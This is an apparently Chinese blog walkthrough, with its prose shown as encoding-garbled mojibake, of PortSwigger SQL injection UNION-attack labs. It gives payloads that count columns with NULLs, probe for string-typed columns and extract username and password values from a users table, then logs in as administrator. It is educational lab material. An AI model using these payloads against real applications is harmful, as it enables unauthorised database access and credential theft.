<li>åº”ç”¨ç¨‹åºå¯èƒ½åœ¨HTTPå“åº”ä¸­è¿”å›æ•°æ®åº“é”™è¯¯ï¼Œä¹Ÿå¯èƒ½è¿”å›ä¸€èˆ¬çš„é”™è¯¯å“åº”ï¼Œç”šè‡³å¯èƒ½ä¸è¿”å›ä»»ä½•é”™è¯¯æç¤ºã€‚æ— è®ºå“ªç§æ–¹å¼ï¼Œåªè¦èƒ½å¤Ÿæ£€æµ‹åˆ°é”™è¯¯ï¼Œå°±å¯ä»¥æ¨æ–­å‡ºåŸå§‹æŸ¥è¯¢è¿”å›çš„åˆ—æ•°</li>
</ul>
</li>
<li>ä½¿ç”¨ä¸€ç³»åˆ—æŒ‡å®šä¸åŒæ•°é‡çš„ç©ºå€¼çš„<code>UNION SELECT</code>è¯­å¥ï¼Œç›´åˆ°åº”ç”¨ç¨‹åºä¸å†è¿”å›é”™è¯¯<ul>
<li>ä¾‹å­ï¼š  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># å¦‚æœNULLçš„æ•°é‡ä¸åŒ¹é…ï¼Œæ•°æ®åº“å°†è¿”å›é”™è¯¯</span></span><br><span class="line"><span class="string"># NULLå¯ä»¥ä¸ºæ¯ä¸€ç§å¸¸è§çš„æ•°æ®ç±»å‹ï¼Œå› æ­¤å½“åˆ—æ•°æ­£ç¡®æ—¶ï¼Œèƒ½æœ€å¤§é™åº¦åœ°æé«˜äº†æœ‰æ•ˆè´Ÿè½½æˆåŠŸçš„æœºä¼š</span></span><br></pre></td></tr></table></figure></li>
<li>ä¸<code>ORDER BY</code>å­å¥ä¸€æ ·ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½åœ¨HTTPå“åº”ä¸­è¿”å›æ•°æ®åº“é”™è¯¯ï¼Œä¹Ÿå¯èƒ½è¿”å›ä¸€èˆ¬çš„é”™è¯¯å“åº”ï¼Œç”šè‡³å¯èƒ½ä¸è¿”å›ä»»ä½•é”™è¯¯æç¤ºã€‚</li>
<li>ä½†å¦‚æœ NULL å€¼çš„æ•°é‡åŒç»“æœé›†ä¸­åˆ—çš„æ•°é‡åŒ¹é…ï¼Œæ•°æ®åº“ä¼šåœ¨ç»“æœé›†ä¸­è¿”å›é¢å¤–çš„åˆ—ï¼Œå…¶ä¸­æ¯ä¸€åˆ—ä¼šåŒ…å« NULL å€¼ã€‚å¯¹ HTTP å“åº”çš„å½±å“å–å†³äºåº”ç”¨ç¨‹åºçš„ä»£ç å®ç°ã€‚å¦‚æœå¤Ÿå¹¸è¿çš„è¯ï¼Œä½ å¯ä»¥åœ¨å“åº”ä¸­çœ‹åˆ°å…¶ä»–å†…å®¹ï¼Œä¾‹å¦‚ HTML è¡¨æ ¼çš„é¢å¤–è¡Œã€‚å¦åˆ™ï¼ŒNULL å€¼å¯èƒ½è§¦å‘å…¶ä»–é”™è¯¯ï¼Œä¾‹å¦‚ NullPointerExceptionã€‚æœ€åçš„æƒ…å†µä¸‹ï¼Œå“åº”å¯èƒ½ä¸ç”±ä¸æ­£ç¡®çš„ NULL æ•°å¼•èµ·çš„å“åº”æ²¡æœ‰åŒºåˆ«ï¼Œä½¿å¾—ç¡®å®šåˆ—æ•°çš„æ­¤æ–¹æ³•æ— æ•ˆã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ3ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°"><a href="#ğŸ§ªå®éªŒ3ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°" class="headerlink" title="ğŸ§ªå®éªŒ3ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°"></a>ğŸ§ªå®éªŒ3ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°</h3><h4 id="å®éªŒè¯´æ˜-2"><a href="#å®éªŒè¯´æ˜-2" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><p>ç±»åˆ«åˆ é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ï¼ŒæŸ¥è¯¢ç»“æœåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¿™ç§æ”»å‡»çš„ç¬¬ä¸€æ­¥æ—¶ç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°ã€‚ç„¶åå†åç»­çš„å®éªŒä¸­å°†ä½¿ç”¨æ­¤æŠ€æœ¯æ„å»ºå®Œæ•´çš„æ”»å‡»ã€‚</p>
<h4 id="è§£é¢˜è¿‡ç¨‹-2"><a href="#è§£é¢˜è¿‡ç¨‹-2" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ä½¿ç”¨<code>UNION SELECT NULL</code>è¿›è¡Œæ³¨å…¥ï¼Œç›´åˆ°ä¸å†è¿”å›é”™è¯¯ï¼š<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB3-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
</ul>
<h3 id="æ•°æ®åº“ç‰¹å®šç”¨æ³•"><a href="#æ•°æ®åº“ç‰¹å®šç”¨æ³•" class="headerlink" title="æ•°æ®åº“ç‰¹å®šç”¨æ³•"></a>æ•°æ®åº“ç‰¹å®šç”¨æ³•</h3><ul>
<li>åœ¨Oracleä¸Šï¼Œæ¯ä¸ª<code>SELECT</code>è¯­å¥å¿…é¡»åŒ…å«<code>FROM</code>å…³é”®å­—å¹¶æŒ‡å®šä¸€ä¸ªæœ‰æ•ˆçš„è¡¨ã€‚</li>
<li>Oracleä¸Šæœ‰ä¸€ä¸ªåä¸º<code>DUAL</code>çš„å†…ç½®è¡¨ï¼Œå› æ­¤åœ¨Oracleä¸Šæ‰§è¡Œ<code>UNION</code>æ”»å‡»æ—¶æŸ¥è¯¢å¯ä»¥æ˜¯ï¼š  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure></li>
<li>payloadä½¿ç”¨åŒç ´æŠ˜å·<code>--</code>æ³¨é‡Šæ‰åŸå§‹æŸ¥è¯¢çš„å‰©ä½™éƒ¨åˆ†ã€‚</li>
<li>åœ¨MySQLä¸Šï¼ŒåŒç ´æŠ˜å·åçš„æ³¨é‡Šç¬¦<code>--</code>åå¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚æˆ–è€…å¯ä»¥ä½¿ç”¨<code>#</code>ä½œä¸ºæ³¨é‡Šç¬¦ã€‚</li>
<li>æœ‰å…³ç‰¹å®šæ•°æ®åº“çš„è¯­æ³•ï¼Œè¯¦è§<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"><code>SQL injection cheat sheet</code></a></li>
</ul>
<h2 id="æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"><a href="#æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—" class="headerlink" title="æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"></a>æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—</h2><ul>
<li>SQLæ³¨å…¥UNIONæ”»å‡»èƒ½ä»æ³¨å…¥çš„æŸ¥è¯¢ä¸­æ£€ç´¢ç»“æœã€‚é€šå¸¸æƒ³è¦æ£€ç´¢çš„æ•°æ®æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„ã€‚è¿™æ„å‘³ç€éœ€è¦åœ¨åŸå§‹æŸ¥è¯¢ç»“æœä¸­æ‰¾åˆ°æ•°æ®ç±»å‹ä¸ºå­—ç¬¦ä¸²æ•°æ®æˆ–ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹çš„ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ã€‚</li>
<li>ç¡®å®šæ‰€éœ€åˆ—çš„æ•°é‡åï¼Œå¯ä»¥æ¢æµ‹æ¯ä¸€åˆ—ä»¥æµ‹è¯•å®ƒæ˜¯å¦å¯ä»¥å®¹çº³å­—ç¬¦ä¸²æ•°æ®ï¼Œå¯ä»¥æäº¤ä¸€ç³»åˆ—çš„<code>UNION SELECT</code>çš„payloadï¼Œä¾æ¬¡å°†å­—ç¬¦ä¸²æ•°æ®æ’å…¥åˆ°æ¯ä¸€åˆ—ä¸­ã€‚å¦‚æœåˆ—æ•°æ®ç±»å‹ä¸å­—ç¬¦ä¸²æ•°æ®ä¸å…¼å®¹ï¼Œåˆ™æ³¨å…¥çš„æŸ¥è¯¢å°†å¯¼è‡´æ•°æ®åº“é”™è¯¯ã€‚å¦‚æœæ²¡æœ‰å‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºçš„å“åº”åŒ…å«ä¸€äº›é™„åŠ å†…å®¹ï¼ˆåŒ…æ‹¬æ³¨å…¥çš„å­—ç¬¦ä¸²å€¼ï¼‰ï¼Œåˆ™ç›¸å…³åˆ—é€‚åˆäºæ£€ç´¢å­—ç¬¦ä¸²æ•°æ®ã€‚</li>
<li>ä¾‹å­ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># é¦–å…ˆç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°æ˜¯<span class="number">4</span>åˆ—ï¼Œç„¶åæ¢æµ‹æ¯ä¸€åˆ—ä»¥æµ‹è¯•å®ƒæ˜¯å¦å¯ä»¥å®¹çº³å­—ç¬¦ä¸²æ•°æ®</span><br><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="ğŸ§ªå®éªŒ4ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼ŒæŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"><a href="#ğŸ§ªå®éªŒ4ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼ŒæŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—" class="headerlink" title="ğŸ§ªå®éªŒ4ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼ŒæŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"></a>ğŸ§ªå®éªŒ4ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼ŒæŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—</h3><h4 id="å®éªŒè¯´æ˜-3"><a href="#å®éªŒè¯´æ˜-3" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢ç»“æœåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¿™ç§æ”»å‡»çš„ç¬¬ä¸€æ­¥æ—¶ç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°ã€‚ç„¶åè¯†åˆ«ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹çš„åˆ—ã€‚</li>
<li>æœ¬å®éªŒå°†æä¾›ä¸€ä¸ªéšæœºå€¼ï¼Œéœ€è¦ä½¿å…¶å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­ã€‚</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-3"><a href="#è§£é¢˜è¿‡ç¨‹-3" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é¦–å…ˆä½¿ç”¨<code>SELECT UNION NULL</code>ç¡®å®šè¿”å›çš„åˆ—æ•°ï¼Œç»æµ‹è¯•ï¼Œå½“æœ‰3ä¸ª<code>NULL</code>æ—¶,å³<code>?category=Accessories&#39; UNION SELECT NULL,NULL,NULL-- </code>ï¼Œä¸å†è¿”å›é”™è¯¯,å› æ­¤è¿”å›çš„åˆ—æ•°ä¸º3<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-1-%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0.png"></li>
<li>ç„¶åç¡®è®¤æœ‰ç”¨çš„æ•°æ®ç±»å‹çš„åˆ—ï¼Œæ‰§è¡Œä»¥ä¸‹payloadï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># åªæœ‰ç¬¬äºŒä¸ªæˆåŠŸï¼Œå› æ­¤ç¬¬äºŒåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;eDqVcW&#x27;</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure></li>
<li>å®éªŒè¦æ±‚ä½¿ç”¨å¹³å°æä¾›çš„éšæœºå€¼ï¼Œå› æ­¤å°†éšæœºå€¼æ’å…¥åˆ°ç¬¬äºŒåˆ—ä¸­ï¼Œå³<code>?category=Accessories&#39; UNION SELECT NULL,&#39;eDqVcW&#39;,NULL-- </code><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97%EF%BC%88%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%8F%90%E4%BE%9B%E7%9A%84%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B5%8B%E8%AF%95%EF%BC%89.png"></li>
<li>å®Œæˆå®éªŒâœ…</li>
</ul>
<h2 id="ä½¿ç”¨SQLæ³¨å…¥UNIONæ”»å‡»æ£€ç´¢æ„Ÿå…´è¶£çš„æ•°æ®"><a href="#ä½¿ç”¨SQLæ³¨å…¥UNIONæ”»å‡»æ£€ç´¢æ„Ÿå…´è¶£çš„æ•°æ®" class="headerlink" title="ä½¿ç”¨SQLæ³¨å…¥UNIONæ”»å‡»æ£€ç´¢æ„Ÿå…´è¶£çš„æ•°æ®"></a>ä½¿ç”¨SQLæ³¨å…¥UNIONæ”»å‡»æ£€ç´¢æ„Ÿå…´è¶£çš„æ•°æ®</h2><ul>
<li>å½“ç¡®å®šäº†åŸå§‹æŸ¥è¯¢è¿”å›çš„åˆ—æ•°å¹¶æ‰¾åˆ°äº†å“ªäº›åˆ—å¯ä»¥ä¿å­˜å­—ç¬¦ä¸²æ•°æ®æ—¶ï¼Œå°±å¯ä»¥æ£€ç´¢æ„Ÿå…´è¶£çš„æ•°æ®äº†ã€‚</li>
<li>å‡è®¾ï¼š<ul>
<li>åŸå§‹æŸ¥è¯¢è¿”å›ä¸¤åˆ—ï¼Œè¿™ä¸¤åˆ—éƒ½å¯ä»¥ä¿å­˜å­—ç¬¦ä¸²æ•°æ®</li>
<li>æ³¨å…¥ç‚¹æ˜¯<code>WHERE</code>å­å¥ä¸­ä¸€ä¸ªå¸¦å¼•å·çš„å­—ç¬¦ä¸²</li>
<li>æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸º<code>users</code>çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«<code>username</code>å’Œ<code>password</code>åˆ—</li>
</ul>
</li>
<li>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹SQLæ³¨å…¥UNIONæ”»å‡»æ¥æ£€ç´¢<code>username</code>å’Œ<code>password</code>åˆ—çš„æ•°æ®ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure></li>
<li>ä¸ºäº†æ‰§è¡Œè¿™ä¸ªæ”»å‡»ï¼Œéœ€è¦<code>users</code>è¡¨åŠåˆ—çš„åç§°ã€‚å¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥çŒœæµ‹è¡¨å’Œåˆ—çš„åç§°ã€‚æ‰€æœ‰ç°ä»£æ•°æ®åº“éƒ½æä¾›äº†æ£€æŸ¥æ•°æ®åº“ç»“æ„çš„æ–¹æ³•ï¼Œèƒ½å¤Ÿé€šè¿‡è¿™äº›æ–¹æ³•æ¥ç¡®å®šè¡¨å’Œåˆ—çš„åç§°ã€‚</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ5ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®"><a href="#ğŸ§ªå®éªŒ5ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®" class="headerlink" title="ğŸ§ªå®éªŒ5ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®"></a>ğŸ§ªå®éªŒ5ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®</h3><h4 id="å®éªŒè¯´æ˜-4"><a href="#å®éªŒè¯´æ˜-4" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢ç»“æœåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚</li>
<li>æ•°æ®åº“ä¸­åŒ…å«ä¸€ä¸ªåä¸º<code>users</code>çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«<code>username</code>å’Œ<code>password</code>åˆ—ã€‚</li>
<li>ä»»åŠ¡ï¼šæ‰§è¡ŒSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œæ£€ç´¢<code>username</code>å’Œ<code>password</code>åˆ—çš„æ•°æ®ï¼Œå¹¶ä½¿ç”¨è¿™äº›ä¿¡æ¯ä»¥<code>administrator</code>çš„èº«ä»½ç™»å½•ã€‚</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-4"><a href="#è§£é¢˜è¿‡ç¨‹-4" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é¦–å…ˆç¡®è®¤åˆ—æ•°ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># æˆåŠŸï¼Œè¯´æ˜è¿”å›çš„åˆ—æ•°ä¸º<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li>ç„¶åç¡®å®šæ¯ä¸€åˆ—çš„ç±»å‹ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># ä¸¤ä¸ªéƒ½æˆåŠŸï¼Œè¯´æ˜ä¸¤åˆ—éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹</span><br></pre></td></tr></table></figure></li>
<li>ä½¿ç”¨<code>?category=Accessories&#39; UNION SELECT username, password FROM users</code>è¿›è¡Œæ³¨å…¥ï¼ŒæˆåŠŸè·å–<code>username</code>å’Œ<code>password</code>åˆ—çš„æ•°æ®<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB5-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
<li>ä½¿ç”¨è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•æˆåŠŸ</li>
<li>å®Œæˆå®éªŒâœ…</li>
</ul>
<h2 id="åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"><a href="#åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼" class="headerlink" title="åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"></a>åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼</h2><ul>
<li>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸Šä¸€ä¸ªç¤ºä¾‹ä¸­çš„æŸ¥è¯¢å¯èƒ½åªè¿”å›å•ä¸ªåˆ—ã€‚é€šè¿‡å°†å€¼è¿æ¥åœ¨ä¸€èµ·ï¼Œå¯ä»¥åœ¨æ­¤å•ä¸ªåˆ—ä¸­åŒæ—¶æ£€ç´¢å¤šä¸ªå€¼ã€‚å¯ä»¥åŒ…å«åˆ†éš”ç¬¦ä»¥åŒºåˆ†ç»„åˆå€¼ã€‚</li>
<li>ä¾‹å­ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username || &#x27;</span><span class="operator">~</span><span class="string">&#x27; || password FROM users--</span></span><br><span class="line"><span class="string"># åœ¨Oracleæ•°æ®åº“ä¸­ï¼Œå¯ä»¥ä½¿ç”¨`||`è¿æ¥è¿ç®—ç¬¦æ¥è¿æ¥å€¼</span></span><br><span class="line"><span class="string"># å°†`username`å’Œ`password`è¿æ¥åœ¨ä¸€èµ·ï¼Œå¹¶ä½¿ç”¨`~`ä½œä¸ºåˆ†éš”ç¬¦ï¼ŒæŸ¥è¯¢çš„ç»“æœåŒ…å«æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="string"># Â·Â·Â·</span></span><br><span class="line"><span class="string"># administrator~s3cure</span></span><br><span class="line"><span class="string"># wiener~peter</span></span><br><span class="line"><span class="string"># Â·Â·Â·</span></span><br></pre></td></tr></table></figure></li>
<li>ä¸åŒçš„æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„è¯­æ³•æ¥æ‰§è¡Œå­—ç¬¦ä¸²è¿æ¥ã€‚è¯¦è§<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
</ul>
<h3 id="ğŸ§ªå®éªŒ6ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"><a href="#ğŸ§ªå®éªŒ6ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼" class="headerlink" title="ğŸ§ªå®éªŒ6ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼"></a>ğŸ§ªå®éªŒ6ï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œåœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢å¤šä¸ªå€¼</h3><h4 id="å®éªŒè¯´æ˜-5"><a href="#å®éªŒè¯´æ˜-5" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢ç»“æœåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨UNIONæ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚</li>
<li>æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸º<code>users</code>çš„è¡¨ï¼Œå…¶ä¸­åŒ…å«<code>username</code>å’Œ<code>password</code>åˆ—ã€‚</li>
<li>ä»»åŠ¡ï¼šæ‰§è¡ŒSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œæ£€ç´¢<code>username</code>å’Œ<code>password</code>åˆ—çš„æ•°æ®ï¼Œå¹¶ä½¿ç”¨è¿™äº›ä¿¡æ¯ä»¥<code>administrator</code>çš„èº«ä»½ç™»å½•ã€‚</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-5"><a href="#è§£é¢˜è¿‡ç¨‹-5" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é¦–å…ˆç¡®è®¤åˆ—æ•°ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># æˆåŠŸï¼Œè¯´æ˜è¿”å›çš„åˆ—æ•°ä¸º<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li>ç„¶åç¡®è®¤æ¯ä¸€åˆ—çš„ç±»å‹ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string"># æŠ¥é”™ï¼Œè¯´æ˜ç¬¬ä¸€åˆ—æ˜¯ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹</span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># æˆåŠŸï¼Œè¯´æ˜ç¬¬äºŒåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹</span><br></pre></td></tr></table></figure></li>
<li>åªæœ‰ä¸€åˆ—æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤éœ€è¦åœ¨å•ä¸ªåˆ—ä¸­æ£€ç´¢<code>username</code>å’Œ<code>password</code>æ‹¼æ¥å€¼ã€‚</li>
